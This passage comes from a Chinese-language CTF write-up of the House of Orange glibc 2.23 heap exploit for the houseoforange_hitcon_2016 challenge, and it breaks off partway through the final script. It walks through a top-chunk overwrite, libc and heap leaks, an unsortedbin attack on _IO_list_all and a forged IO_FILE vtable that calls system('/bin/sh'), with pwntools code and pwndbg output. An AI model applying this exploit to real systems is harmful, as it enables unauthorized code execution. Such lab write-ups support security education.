<li>top chunk的size：0x20af1 =&gt;修改为0xaf1，即只保留后三位</li>
<li>申请0x1000大小即可</li>
</ol>
<h3 id="largebin链"><a href="#largebin链" class="headerlink" title="largebin链"></a>largebin链</h3><p>解链<code>unsorted bin</code>的时候，会先把<code>unsorted bin chunk</code>放在<code>large bin</code>中，就会在<code>fd_nextsize</code>和<code>bk_nextsize</code>上留下堆地址</p>
<h3 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h3><ol>
<li>利用unosortedbin attack修改<code>_IO_list_all</code>，即修改bk为<code>_IO_list_all-0x10</code><ul>
<li>如果<code>main_arena + 88</code>作为文件流地址，那么它的<code>chain</code>指针对应的是<code>smallbin[0x60]</code>。</li>
</ul>
</li>
<li>伪造fake IOFILE，大小为0x60，放入small bin中</li>
</ol>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><blockquote>
<p>house of orange经典题目</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>build：创建。一共创建三个chunk</p>
<p>第一个chunk：0x10大小，存放house指针和orange指针</p>
<p>第二个chunk：指定size创建chunk，填入content</p>
<p>第三个chunk：0x8大小，存放price和color</p>
</li>
<li><p>see：打印chunk内容</p>
</li>
<li><p>upgrade：重新指定size，修改chunk内容。故存在堆溢出</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>程序没有free函数，且存在堆溢出，故使用house of orange技术。</p>
</blockquote>
<ol>
<li>因为程序中没有free函数且存在堆溢出，故修改top chunk内容，再malloc一个大chunk，从而获得一个unsortedbin。</li>
<li>接着分割unsortedbin，得到largebin，从而泄露libc_base和heap_base</li>
<li>将old top chunk大小修改为0x60，并伪造io file。</li>
<li>利用unsortedbin attack修改<code>_IO_list_all</code>，使得0x60的chunk对应<code>_IO_list_all</code>的<code>_chain</code></li>
<li>再次malloc，由于unsortedbin attack后，unsortedbin链异常，故会触发malloc异常，刷新流，找到伪造的io file</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file houseoforange_hitcon_2016 </span><br><span class="line">houseoforange_hitcon_2016: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;a58bda41b65d38949498561b0f2b976ce5c0c301, stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;houseoforange_hitcon_2016&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<h4 id="1-分配一个块"><a href="#1-分配一个块" class="headerlink" title="1.分配一个块"></a>1.分配一个块</h4><blockquote>
<p>用来溢出修改top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555555a2000</span><br><span class="line">0x5555555a2000:	0x0000000000000000	0x0000000000000021#存放house和orange指针的chunk</span><br><span class="line">0x5555555a2010:	0x00005555555a2050	0x00005555555a2030</span><br><span class="line">0x5555555a2020:	0x0000000000000000	0x0000000000000021#存放house内容的chunk，可以溢出</span><br><span class="line">0x5555555a2030:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0x5555555a2040:	0x0000000000000000	0x0000000000000021#存放price和color的chunk</span><br><span class="line">0x5555555a2050:	0x0000001f00000001	0x0000000000000000</span><br><span class="line">0x5555555a2060:	0x0000000000000000	0x0000000000020fa1#top chunk，保留0xfa1即可</span><br><span class="line">0x5555555a2070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="2-溢出，修改top-chunk"><a href="#2-溢出，修改top-chunk" class="headerlink" title="2.溢出，修改top chunk"></a>2.溢出，修改top chunk</h4><blockquote>
<p>通过edit的堆溢出，修改top chunk为0xfa1</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341060</span><br><span class="line">Size: 0xfa1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x555556341000</span><br><span class="line">0x555556341000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341010:	0x0000555556341050	0x0000555556341030</span><br><span class="line">0x555556341020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555556341040:	0x6161616161616161	0x0000000000000021</span><br><span class="line">0x555556341050:	0x0000ddaa00000001	0x0000000000000000</span><br><span class="line">0x555556341060:	0x0000000000000000	0x0000000000000fa1</span><br><span class="line">0x555556341070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556341080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-申请大块，释放top-chunk"><a href="#3-申请大块，释放top-chunk" class="headerlink" title="3.申请大块，释放top chunk"></a>3.申请大块，释放top chunk</h4><blockquote>
<p>申请一个大于0xfa1的chunk，如0x1000，old top chunk会被放入unsortedbin中，并会申请一个新的top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5555574930a0</span><br><span class="line">Size: 0xf41</span><br><span class="line">fd: 0x7fcd0ff56b78</span><br><span class="line">bk: 0x7fcd0ff56b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557493fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557494000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555574930a0 —▸ 0x7fcd0ff56b78 (main_arena+88) ◂— 0x5555574930a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<h4 id="4-切割old-topchunk为large-chunk"><a href="#4-切割old-topchunk为large-chunk" class="headerlink" title="4.切割old topchunk为large chunk"></a>4.切割old topchunk为large chunk</h4><blockquote>
<p>large chunk中留有libc_base和heap_base，可以show出来</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564940a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE#申请来的chunk</span><br><span class="line">Addr: 0x5555564940c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564944d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE#top chunk</span><br><span class="line">Addr: 0x5555564944f0</span><br><span class="line">Size: 0xaf1</span><br><span class="line">fd: 0x7fe4acc50b78</span><br><span class="line">bk: 0x7fe4acc50b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556494fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556495000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555564940c0</span><br><span class="line">0x5555564940c0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555564940d0:	0x00007fe4acc51161	0x00007fe4acc51188</span><br><span class="line">0x5555564940e0:	0x00005555564940c0	0x00005555564940c0</span><br><span class="line">0x5555564940f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556494100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555556494000     0x5555564d7000 rw-p    43000 0      [heap]</span><br><span class="line">    0x7fe4ac8b5000     0x7fe4aca4d000 r-xp   198000 0      &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4aca4d000     0x7fe4acc4c000 ---p   1ff000 198000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc4c000     0x7fe4acc50000 r--p     4000 197000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc50000     0x7fe4acc52000 rw-p     2000 19b000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure>
<h4 id="泄漏libc-base和heap-base"><a href="#泄漏libc-base和heap-base" class="headerlink" title="泄漏libc_base和heap_base"></a>泄漏libc_base和heap_base</h4><blockquote>
<p>这里，name的时候要用send，sendline的话，会导致这里有问题，，，，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show()</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x271 bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 d9 d1  6e 7f 0a 50  72 69 63 65  20 6f 66 20  │aa··│n··P│rice│ of │</span><br><span class="line">[...]</span><br><span class="line">[+] libc_base:0x7f6ed19fa000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x29c bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000020  61 61 61 61  61 61 61 61  c0 10 f0 55  55 55 0a 50  │aaaa│aaaa│···U│UU·P│</span><br><span class="line">[+] heap_base:0x555555f01000</span><br></pre></td></tr></table></figure>
<h4 id="5-fsop"><a href="#5-fsop" class="headerlink" title="5.fsop"></a>5.fsop</h4><blockquote>
<p>通过溢出，修改原来top chunk的内容。</p>
<ol>
<li><p>修改size为0x60，从而unsortbin取走后放入smallbin0x60大小中</p>
</li>
<li><p>伪造io file，最开始放上’/bin/sh\x00’，<code>IO_write_ptr=1&gt;IO_write_base=0</code>，伪造vtache，在_IO_overflow放上system地址</p>
</li>
<li><p>unsortbin attack，修改_IO_list_all为&amp;main_arena，在unsortedbin取链时，会在bk+0x10的位置写上&amp;main_arena</p>
</li>
<li><p>再次malloc的时候，由于unsortedbin异常，故会打印错误，调用如下链：</p>
<p><code>**libc_malloc =&gt; malloc_printerr =&gt;** libc_message =&gt; abort =&gt; _IO_flush_all_lockp</code></p>
<p>由于main_arena那个是错误的io file，会顺着_chain找下一个，也就是我们伪造的io file，从而调用system，get shell</p>
</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb0c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb4d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin)</span><br><span class="line">Addr: 0x555556ffb4f0</span><br><span class="line">Size: 0x60</span><br><span class="line">fd: 0x00</span><br><span class="line">bk: 0x7fee3bd3b510</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555556ffb4f0</span><br><span class="line">0x555556ffb4f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556ffb500:	0x0000000000000000	0x00007fee3bd3b510</span><br><span class="line">0x555556ffb510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556ffb520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5c0:	0x0000000000000000	0x0000555556ffb5c8</span><br><span class="line">0x555556ffb5d0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5e0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5f0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb600:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb610:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb620:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  __dummy &#x3D; 93825020179912, </span><br><span class="line">  __dummy2 &#x3D; 140661179147632, </span><br><span class="line">  __finish &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __overflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __uflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __pbackfail &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsputn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsgetn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __seekoff &#x3D; 0x0, </span><br><span class="line">  __seekpos &#x3D; 0x0, </span><br><span class="line">  __setbuf &#x3D; 0x0, </span><br><span class="line">  __sync &#x3D; 0x0, </span><br><span class="line">  __doallocate &#x3D; 0x0, </span><br><span class="line">  __read &#x3D; 0x0, </span><br><span class="line">  __write &#x3D; 0x0, </span><br><span class="line">  __seek &#x3D; 0x0, </span><br><span class="line">  __close &#x3D; 0x0, </span><br><span class="line">  __stat &#x3D; 0x0, </span><br><span class="line">  __showmanyc &#x3D; 0x0, </span><br><span class="line">  __imbue &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable.__overflow</span><br><span class="line">$1 &#x3D; &#123;int (_IO_FILE *, int)&#125; 0x7fee3b9de570 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fee3bd3b510</span><br><span class="line">0x7fee3bd3b510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fee3bd3b520 &lt;__GI__IO_list_all&gt;:	0x00007fee3bd3b540	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="6-malloc报错"><a href="#6-malloc报错" class="headerlink" title="6.malloc报错"></a>6.malloc报错</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b7510</span><br><span class="line">0x7faf3a0b7510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faf3a0b7520 &lt;__GI__IO_list_all&gt;:	0x00007faf3a0b6b78	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt;  p _IO_list_all</span><br><span class="line">$1 &#x3D; (struct _IO_FILE_plus *) 0x7faf3a0b6b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b6b78 + 0x60</span><br><span class="line">0x7faf3a0b6bd8 &lt;main_arena+184&gt;:	0x0000555556b754f0	0x0000555556b754f0</span><br><span class="line">0x7faf3a0b6be8 &lt;main_arena+200&gt;:	0x00007faf3a0b6bd8	0x00007faf3a0b6bd8</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000555556b754f0</span><br><span class="line">0x555556b754f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556b75500:	0x00007faf3a0b6bc8	0x00007faf3a0b6bc8</span><br><span class="line">0x555556b75510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556b75520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755c0:	0x0000000000000000	0x0000555556b755c8</span><br><span class="line">0x555556b755d0:	0x00007faf39d5a570	0x00007faf39d5a570</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">file =<span class="string">'houseoforange_hitcon_2016'</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">      env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process(<span class="string">"./houseoforange_hitcon_2016"</span>,</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">  p.sendline(str(choice))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">1</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Price of Orange"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Color of Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span 